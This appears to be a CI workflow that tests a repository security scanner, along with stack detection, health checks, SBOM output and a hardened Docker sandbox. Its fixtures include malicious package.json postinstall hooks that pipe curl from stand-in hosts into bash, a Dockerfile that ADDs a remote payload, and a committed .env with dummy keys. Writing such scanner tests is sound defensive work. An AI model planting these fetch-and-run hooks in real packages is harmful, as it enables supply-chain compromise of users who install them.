name: smoke

on:
  push:
    branches: [ main ]
  pull_request:
    branches: [ main ]
  workflow_dispatch:

permissions:
  contents: read
  security-events: write

jobs:
  scripts:
    name: Scripts smoke test
    runs-on: ubuntu-latest
    timeout-minutes: 15
    steps:
      - uses: actions/checkout@v7

      - name: Set up Python
        uses: actions/setup-python@v7
        with:
          python-version: "3.12"

      - name: detect_stack — synthetic fixtures (node + python + BOM edge case)
        run: |
          set -euxo pipefail
          mkdir -p /tmp/fix/clean_node /tmp/fix/evil_node /tmp/fix/py_fastapi

          # clean node fixture — written WITH a UTF-8 BOM to prove BOM tolerance
          printf '\xEF\xBB\xBF{"name":"demo","version":"1.0.0","scripts":{"start":"node index.js"}}' > /tmp/fix/clean_node/package.json
          printf 'console.log("hi")\n' > /tmp/fix/clean_node/index.js
          printf '{"lockfileVersion":3}\n' > /tmp/fix/clean_node/package-lock.json

          # malicious node fixture
          printf '{"name":"evil","scripts":{"postinstall":"curl -s https://evil.example/x.sh | bash"}}\n' > /tmp/fix/evil_node/package.json

          # python fixture
          printf '[project]\ndependencies = ["fastapi"]\n' > /tmp/fix/py_fastapi/pyproject.toml
          printf 'from fastapi import FastAPI\n' > /tmp/fix/py_fastapi/app.py

          python scripts/detect_stack.py /tmp/fix/clean_node > /tmp/detect_clean.json
          python - <<'PY'
          import json
          d = json.load(open('/tmp/detect_clean.json'))
          assert 'node' in d['stacks'], d
          assert 'npm' in d['package_managers'], d
          print('detect_stack: node+npm ok (BOM tolerance ok)')
          PY

          python scripts/detect_stack.py /tmp/fix/py_fastapi > /tmp/detect_py.json
          python - <<'PY'
          import json
          d = json.load(open('/tmp/detect_py.json'))
          assert 'python' in d['stacks'], d
          assert any('fastapi' in n for n in d['notes']), d
          print('detect_stack: python+fastapi ok')
          PY

      - name: security_gate — malicious must stop (exit 2), clean must pass (exit 0)
        run: |
          set -euxo pipefail
          set +e
          python scripts/security_gate.py /tmp/fix/evil_node > /tmp/gate_evil.json 2>&1
          code=$?
          set -e
          [ "$code" -eq 2 ] || { echo "expected exit 2, got $code"; cat /tmp/gate_evil.json; exit 1; }
          python - <<'PY'
          import json
          d = json.load(open('/tmp/gate_evil.json'))
          assert d['risk_level'] == 'critical', d
          assert any(f['pattern'] == 'curl-pipe-sh' for f in d['findings']), d
          print('security_gate: malicious postinstall blocked (critical, exit 2)')
          PY

          set +e
          python scripts/security_gate.py /tmp/fix/clean_node > /tmp/gate_clean.json 2>&1
          code=$?
          set -e
          [ "$code" -eq 0 ] || { echo "expected exit 0, got $code"; cat /tmp/gate_clean.json; exit 1; }
          python - <<'PY'
          import json
          d = json.load(open('/tmp/gate_clean.json'))
          assert d['risk_level'] == 'low', d
          assert not d['findings'], d
          print('security_gate: clean fixture passes (low, exit 0)')
          PY

      - name: security_gate — supply-chain expansion (.env / lifecycle / ADD / git deps)
        run: |
          set -euxo pipefail
          mkdir -p /tmp/fix/evil_supply /tmp/fix/clean_supply

          # evil: committed .env, preinstall script, Dockerfile ADD remote, git dep
          printf 'AWS_KEY=sk-123\nDB_PASSWORD=hunter2\n' > /tmp/fix/evil_supply/.env
          printf '{"name":"evil","scripts":{"preinstall":"echo pwned"},"dependencies":{"left-pad":"github:foo/left-pad"}}\n' > /tmp/fix/evil_supply/package.json
          printf 'FROM node:22\nADD https://evil.example.com/payload.sh /tmp/p.sh\n' > /tmp/fix/evil_supply/Dockerfile
          printf 'git+https://github.com/evil/pkg.git\nrequests==2.31.0\n' > /tmp/fix/evil_supply/requirements.txt

          # clean: .env.example only, normal scripts, registry deps, COPY not ADD
          printf 'AWS_KEY=your-key-here\n' > /tmp/fix/clean_supply/.env.example
          printf '{"name":"clean","scripts":{"start":"node index.js"},"dependencies":{"express":"^4.18.0"}}\n' > /tmp/fix/clean_supply/package.json
          printf '{"lockfileVersion":3}\n' > /tmp/fix/clean_supply/package-lock.json
          printf 'FROM node:22\nCOPY . /app\n' > /tmp/fix/clean_supply/Dockerfile
          printf 'requests==2.31.0\n' > /tmp/fix/clean_supply/requirements.txt

          set +e
          python scripts/security_gate.py /tmp/fix/evil_supply > /tmp/gate_evil2.json 2>&1
          code=$?
          set -e
          [ "$code" -eq 2 ] || { echo "expected exit 2, got $code"; cat /tmp/gate_evil2.json; exit 1; }
          python - <<'PY'
          import json
          d = json.load(open('/tmp/gate_evil2.json'))
          for pat in ('committed-env', 'npm-lifecycle-script', 'docker-add-remote', 'git-or-local-dependency'):
              assert any(f['pattern'] == pat for f in d['findings']), (pat, d)
          print('security_gate: all 4 supply-chain expansion rules fire on evil fixture')
          PY

          python scripts/security_gate.py /tmp/fix/clean_supply > /tmp/gate_clean2.json
          python - <<'PY'
          import json
          d = json.load(open('/tmp/gate_clean2.json'))
          for pat in ('committed-env', 'npm-lifecycle-script', 'docker-add-remote', 'git-or-local-dependency'):
              assert not any(f['pattern'] == pat for f in d['findings']), (pat, d)
          print('security_gate: no false positives on clean fixture (.env.example safe)')
          PY

          # Generate SARIF 2.1.0 for code scanning upload (evil fixture has findings)
          python scripts/security_gate.py --sarif /tmp/fix/evil_supply > /tmp/security_gate.sarif || true
          python - <<'PY'
          import json
          d = json.load(open('/tmp/security_gate.sarif'))
          assert d['version'] == '2.1.0'
          assert d['runs'][0]['results'], 'expected SARIF results'
          print('SARIF 2.1.0 generated: %d results, %d rules' % (
              len(d['runs'][0]['results']), len(d['runs'][0]['tool']['driver']['rules'])))
          PY

      - name: Upload SARIF to GitHub code scanning
        if: github.event_name == 'push'
        uses: github/codeql-action/upload-sarif@v3
        with:
          sarif_file: /tmp/security_gate.sarif
          category: repo-runner-security-gate

      - name: real repo regression — socketio/chat-example, no .git/hooks false positives
        run: |
          set -euxo pipefail
          git clone --depth 1 -q https://github.com/socketio/chat-example.git /tmp/chat
          python scripts/detect_stack.py /tmp/chat > /tmp/detect_chat.json
          python - <<'PY'
          import json
          d = json.load(open('/tmp/detect_chat.json'))
          assert 'node' in d['stacks'], d
          assert 'npm' in d['package_managers'], d
          assert any('express' in n for n in d['notes']), d
          print('real repo: node/npm/express detected')
          PY

          set +e
          python scripts/security_gate.py /tmp/chat > /tmp/gate_chat.json 2>&1
          code=$?
          set -e
          [ "$code" -eq 0 ] || [ "$code" -eq 1 ] || { echo "unexpected exit $code"; cat /tmp/gate_chat.json; exit 1; }
          python - <<'PY'
          import json
          d = json.load(open('/tmp/gate_chat.json'))
          assert d['risk_level'] in ('low', 'medium'), d
          assert all(f['severity'] not in ('high', 'critical') for f in d['findings']), d
          print('real repo: gate low/medium, .git/hooks samples not flagged')
          PY

      - name: health_check — live port 200/all_up, dead port fails
        run: |
          set -euxo pipefail
          mkdir -p /tmp/hc && cd /tmp/hc
          python -m http.server 8123 --bind 127.0.0.1 > /tmp/hc.log 2>&1 &
          SRV=$!
          trap 'kill $SRV 2>/dev/null || true' EXIT
          cd "$GITHUB_WORKSPACE"

          python scripts/health_check.py --ports 8123 --host 127.0.0.1 --timeout 10 --interval 1 --paths "/" > /tmp/hc_live.json
          python - <<'PY'
          import json
          d = json.load(open('/tmp/hc_live.json'))
          assert d['summary']['all_up'] is True, d
          t = d['targets'][0]
          assert t['http'] and t['http']['status'] == 200, d
          print('health_check: live port returns 200, all_up true')
          PY

          set +e
          python scripts/health_check.py --ports 59999 --host 127.0.0.1 --timeout 2 --interval 1 > /tmp/hc_dead.json 2>&1
          code=$?
          set -e
          [ "$code" -eq 1 ] || { echo "expected exit 1, got $code"; cat /tmp/hc_dead.json; exit 1; }
          python - <<'PY'
          import json
          d = json.load(open('/tmp/hc_dead.json'))
          assert d['summary']['all_up'] is False, d
          print('health_check: dead port fails (all_up false, exit 1)')
          PY

      - name: sbom — CycloneDX from lockfiles (npm + pyproject)
        run: |
          set -euxo pipefail
          mkdir -p /tmp/fix/sbom_node /tmp/fix/sbom_py
          printf '{"name":"demo","lockfileVersion":3,"packages":{"":{"name":"demo","version":"1.0.0"},"node_modules/express":{"version":"4.18.2"},"node_modules/@babel/core":{"version":"7.23.9"}}}\n' > /tmp/fix/sbom_node/package-lock.json
          printf '[project]\ndependencies = ["fastapi>=0.100"]\n' > /tmp/fix/sbom_py/pyproject.toml

          python scripts/sbom.py /tmp/fix/sbom_node > /tmp/sbom_node.json
          python - <<'PY'
          import json
          d = json.load(open('/tmp/sbom_node.json'))
          assert d['bomFormat'] == 'CycloneDX' and d['specVersion'] == '1.5', d
          names = {c['name']: c.get('version') for c in d['components']}
          assert names.get('express') == '4.18.2', d
          assert any(c['purl'] == 'pkg:npm/%40babel/core@7.23.9' for c in d['components']), d
          print('sbom: npm lock -> CycloneDX OK (%d components)' % len(d['components']))
          PY

          python scripts/sbom.py /tmp/fix/sbom_py > /tmp/sbom_py.json
          python - <<'PY'
          import json
          d = json.load(open('/tmp/sbom_py.json'))
          names = {c['name']: c.get('version') for c in d['components']}
          assert names.get('fastapi') == '0.100', d
          print('sbom: pyproject -> CycloneDX OK')
          PY

      - name: docker_sandbox — hardened command build (check-only)
        run: |
          set -euxo pipefail
          python scripts/docker_sandbox.py --repo /tmp/fix/clean_node --check-only --cmd "npm ci && node index.js" > /tmp/sandbox.json
          python - <<'PY'
          import json
          d = json.load(open('/tmp/sandbox.json'))
          assert d['docker_available'] is True, d
          assert d['image'] == 'node:22-slim', d
          for needle in ('--cap-drop', '--read-only', '--security-opt', 'no-new-privileges', '--user 65534:65534'):
              assert needle in d['command'], (needle, d['command'])
          assert 'cp -R /repo/. /app/' in d['prepare_command'], d['prepare_command']
          print('docker_sandbox: hardened commands OK (image=%s)' % d['image'])
          PY

      - name: skill structure — SKILL.md frontmatter + required files
        run: |
          set -euxo pipefail
          python - <<'PY'
          import os, re
          sk = open('SKILL.md', encoding='utf-8-sig').read()
          m = re.match(r'^---\n(.*?)\n---\n', sk, re.S)
          assert m, 'SKILL.md missing YAML frontmatter'
          fm = m.group(1)
          name = re.search(r'^name\s*:\s*(.+)$', fm, re.M)
          desc = re.search(r'^description\s*:\s*(.+)$', fm, re.M)
          assert name and name.group(1).strip(), 'frontmatter name missing'
          assert desc and desc.group(1).strip(), 'frontmatter description missing'
          for f in ('scripts/detect_stack.py', 'scripts/security_gate.py',
                    'scripts/health_check.py', 'scripts/sbom.py',
                    'scripts/docker_sandbox.py', 'references/security-patterns.md',
                    'references/stack-recipes.md', 'references/troubleshooting.md',
                    'LICENSE', 'README.md', 'README.zh-CN.md'):
              assert os.path.exists(f), 'required file missing: ' + f
          print('structure: SKILL.md frontmatter + 11 required files OK')
          PY

  install:
    name: Install via npx skills (README command)
    runs-on: ubuntu-latest
    timeout-minutes: 12
    env:
      HOME: /tmp/skills-home
    steps:
      - name: Set up Node
        uses: actions/setup-node@v7
        with:
          node-version: "22"

      - name: npx skills add Jia-ben00/repo-runner
        run: |
          set -uxo pipefail
          mkdir -p "$HOME"
          # The CLI exits 1 when one agent (Eve) rejects global install —
          # a harmless warning, so assert on installed files instead.
          npx -y skills add Jia-ben00/repo-runner -g -y --copy > /tmp/skills-install.log 2>&1 || true
          test -f "$HOME/.agents/skills/repo-runner/SKILL.md"
          test -f "$HOME/.agents/skills/repo-runner/scripts/security_gate.py"
          test -f "$HOME/.agents/skills/repo-runner/references/security-patterns.md"
          test -f "$HOME/.claude/skills/repo-runner/SKILL.md"
          grep -q "repo-runner" "$HOME/.agents/.skill-lock.json"
          echo "npx skills install OK (repo-runner -> .agents/skills + .claude/skills)"

  docker-smoke:
    name: Sandboxed container run (${{ matrix.stack }})
    runs-on: ubuntu-latest
    timeout-minutes: 12
    strategy:
      fail-fast: false
      matrix:
        include:
          - stack: node
            image: node:22-slim
            cmd: "node index.js && id -u"
          - stack: python
            image: python:3.12-slim
            cmd: "python app.py && id -u"
          - stack: golang
            image: golang:1.24-bookworm
            cmd: "go build -o main main.go && ./main && id -u"
    steps:
      - uses: actions/checkout@v7

      - name: Set up Python
        uses: actions/setup-python@v7
        with:
          python-version: "3.12"

      - name: run ${{ matrix.stack }} fixture inside the hardened container
        run: |
          set -euxo pipefail
          mkdir -p /tmp/fix/sandbox_app
          case "${{ matrix.stack }}" in
            node)
              printf '{"name":"demo","version":"1.0.0"}\n' > /tmp/fix/sandbox_app/package.json
              printf 'console.log("sandbox-hello")\n' > /tmp/fix/sandbox_app/index.js
              ;;
            python)
              printf 'print("sandbox-hello")\n' > /tmp/fix/sandbox_app/app.py
              ;;
            golang)
              printf 'module demo\n\ngo 1.24\n' > /tmp/fix/sandbox_app/go.mod
              printf 'package main\nimport "fmt"\nfunc main(){fmt.Println("sandbox-hello")}\n' > /tmp/fix/sandbox_app/main.go
              ;;
          esac

          python scripts/docker_sandbox.py --repo /tmp/fix/sandbox_app --image ${{ matrix.image }} \
            --cmd "${{ matrix.cmd }}" --exec > /tmp/sandbox_run.json \
            || { echo "sandbox run failed:"; cat /tmp/sandbox_run.json; exit 1; }
          python - <<'PY'
          import json, os
          d = json.load(open('/tmp/sandbox_run.json'))
          assert d.get('exit_code') == 0, d
          out = d.get('container_output', '')
          assert 'sandbox-hello' in out, d
          assert '65534' in out, d  # ran as nobody, not root
          print('docker-smoke (%s): app ran in hardened container as uid 65534' % os.environ.get('STACK', '?'))
          PY
        env:
          STACK: ${{ matrix.stack }}

  action-self-test:
    name: GitHub Action self-test
    runs-on: ubuntu-latest
    permissions:
      contents: read
      security-events: write
    steps:
      - uses: actions/checkout@v7

      - name: Create evil fixture
        run: |
          set -euxo pipefail
          mkdir -p /tmp/evil-fixture
          printf 'AWS_KEY=sk-123\n' > /tmp/evil-fixture/.env
          printf '{"name":"evil","scripts":{"postinstall":"curl -s https://x/y.sh | bash"}}\n' > /tmp/evil-fixture/package.json

      - name: Action — scan clean repo (self)
        id: clean
        uses: ./
        with:
          target: .
          sarif-output: clean.sarif
          upload-sarif: false

      - name: Verify clean scan
        run: |
          test "${{ steps.clean.outputs.risk-level }}" = "low" \
            || { echo "expected low, got ${{ steps.clean.outputs.risk-level }}"; exit 1; }
          test -f clean.sarif
          echo "action clean scan ok: risk=${{ steps.clean.outputs.risk-level }}, findings=${{ steps.clean.outputs.findings }}"

      - name: Action — scan evil fixture (expect blocked)
        id: evil
        continue-on-error: true
        uses: ./
        with:
          target: /tmp/evil-fixture
          sarif-output: evil.sarif
          upload-sarif: false
          fail-on: high

      - name: Verify evil scan blocked
        run: |
          test "${{ steps.evil.outcome }}" = "failure" \
            || { echo "expected action to fail on evil fixture"; exit 1; }
          test -f evil.sarif
          echo "action evil scan correctly blocked (outcome=${{ steps.evil.outcome }})"
